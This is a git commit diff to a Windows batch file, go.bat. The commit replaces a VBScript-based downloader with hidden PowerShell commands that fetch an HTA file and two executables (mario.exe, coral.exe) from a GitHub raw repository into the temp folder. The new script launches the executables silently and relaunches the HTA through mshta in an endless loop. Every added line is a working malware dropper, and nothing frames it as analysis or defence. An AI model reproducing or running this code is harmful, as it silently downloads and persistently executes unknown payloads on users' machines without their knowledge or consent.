3f13f43abec2cb6a98244838d3988e43d7e5bfb7
jinafaz <48602030+jinafaz@users.noreply.github.com>
2019-03-16 01:04:14 +0000

    Update go.bat

--- go.bat
+++ go.bat
@@ -1,3 +1,22 @@
-echo strUrl = WScript.Arguments.Item(0) > wget.vbs&echo StrFile = WScript.Arguments.Item(1) >> wget.vbs&echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs&echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs&echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs&echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs&echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs&echo Err.Clear >> wget.vbs&echo Set http = Nothing >> wget.vbs&echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs&echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs&echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs&echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs&echo http.Open "GET", strURL, False >> wget.vbs&echo http.Send >> wget.vbs&echo varByteArray = http.ResponseBody >> wget.vbs&echo Set http = Nothing >> wget.vbs&echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs&echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs&echo strData = "" >> wget.vbs&echo strBuffer = "" >> wget.vbs&echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs&echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs&echo Next >> wget.vbs&echo ts.Close >> wget.vbs
+:top0
+ timeout /t 1 &
+powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta -Outfile %tmp%/mathew.hta
+goto top1
 
-powershell -windowstyle hidden cscript wget.vbs https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta %tmp%/mathew.hta && mshta.exe %tmp%/mathew.hta
+:top1
+ timeout /t 1 &
+powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mario.exe -Outfile %tmp%/mario.exe
+cmd /c start /B %tmp%/mario.exe
+goto top2
+
+:top2
+ timeout /t 1 &
+powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/coral.exe -Outfile %tmp%/coral.exe
+cmd /c start /B %tmp%/coral.exe
+goto top3 
+
+:top3 
+timeout /t 100 &
+taskkill /IM mshta.exe /F
+powershell invoke-expression 'mshta %tmp%/mathew.hta'
+goto top3
